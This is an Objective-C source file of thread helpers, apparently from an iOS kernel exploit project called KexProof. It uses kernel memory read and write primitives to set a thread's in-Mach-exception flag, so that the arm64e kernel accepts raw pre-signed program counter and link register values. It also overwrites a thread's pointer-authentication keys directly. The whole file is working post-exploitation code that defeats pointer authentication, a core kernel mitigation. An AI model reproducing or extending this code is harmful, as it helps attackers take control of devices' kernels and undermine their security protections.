// thread.m — thread helpers port (lara thread.m) for KexProof.
#import "rc.h"
#import <mach/mach.h>

static uint16_t kp_thread_get_options(uint64_t threadaddr)
{
    return kp_rc_kread16(threadaddr + KP_OFF_THREAD_OPTIONS);
}

static void kp_thread_set_options(uint64_t threadaddr, uint16_t options)
{
    kp_rc_kwrite16(threadaddr + KP_OFF_THREAD_OPTIONS, options);
}

// lara threadsetstate: TH_IN_MACH_EXCEPTION makes the kernel accept raw
// (pre-signed) pc/lr on arm64e instead of re-signing them with the thread's
// current keys — mandatory since we swap keys right after.
bool kp_threadsetstate(mach_port_t machthread, uint64_t threadaddr, kp_arm_thread_state64_internal *state)
{
    uint16_t options = 0;
    if (threadaddr) {
        options = kp_thread_get_options(threadaddr);
        options |= KP_TH_IN_MACH_EXCEPTION;
        kp_thread_set_options(threadaddr, options);
    }

    kern_return_t kr = thread_set_state(machthread, ARM_THREAD_STATE64,
                                        (thread_state_t)state, ARM_THREAD_STATE64_COUNT);
    if (kr != KERN_SUCCESS) return false;

    if (threadaddr) {
        options &= ~KP_TH_IN_MACH_EXCEPTION;
        kp_thread_set_options(threadaddr, options);
    }
    return true;
}

void kp_threadsetpac(uint64_t threadaddr, uint64_t keya, uint64_t keyb)
{
    kp_rc_kwrite64(threadaddr + KP_OFF_THREAD_MACHINE_ROP_PID, keya);
    kp_rc_kwrite64(threadaddr + KP_OFF_THREAD_MACHINE_JOP_PID, keyb);
}
